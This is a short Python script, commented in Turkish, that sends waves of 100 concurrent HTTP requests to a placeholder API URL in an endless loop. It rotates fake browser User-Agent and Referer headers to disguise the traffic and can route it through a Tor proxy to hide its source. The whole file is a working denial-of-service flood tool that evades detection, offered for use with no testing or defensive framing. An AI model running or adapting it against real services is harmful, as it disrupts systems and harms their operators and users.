import asyncio
import httpx
import random

# Ayarlar
url = "API_URL_HERE"
use_proxy = False
concurrent_requests = 100
proxy_url = "socks5h://127.0.0.1:9050"

# User-Agent havuzu
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/113.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/112.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B)",
    "Mozilla/5.0 (iPad; CPU OS 14_2 like Mac OS X)"
]

# Referer havuzu
referers = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://www.youtube.com/",
    "https://www.facebook.com/"
]

# Accept header'ları
accept_headers = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "application/json, text/plain, */*",
    "*/*"
]

def get_random_headers():
    return {
        "User-Agent": random.choice(user_agents),
        "Referer": random.choice(referers),
        "Accept": random.choice(accept_headers),
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9"
    }

async def send_request(client):
    headers = get_random_headers()
    try:
        if use_proxy:
            response = await client.get(url, headers=headers, proxies=proxy_url, timeout=5.0)
        else:
            response = await client.get(url, headers=headers, timeout=5.0)
        print(f"Durum: {response.status_code}")
    except Exception as e:
        print(f"Hata: {e}")

async def main():
    limits = httpx.Limits(max_keepalive_connections=100, max_connections=100)
    async with httpx.AsyncClient(limits=limits) as client:
        while True:
            tasks = [send_request(client) for _ in range(concurrent_requests)]
            await asyncio.gather(*tasks)

asyncio.run(main())
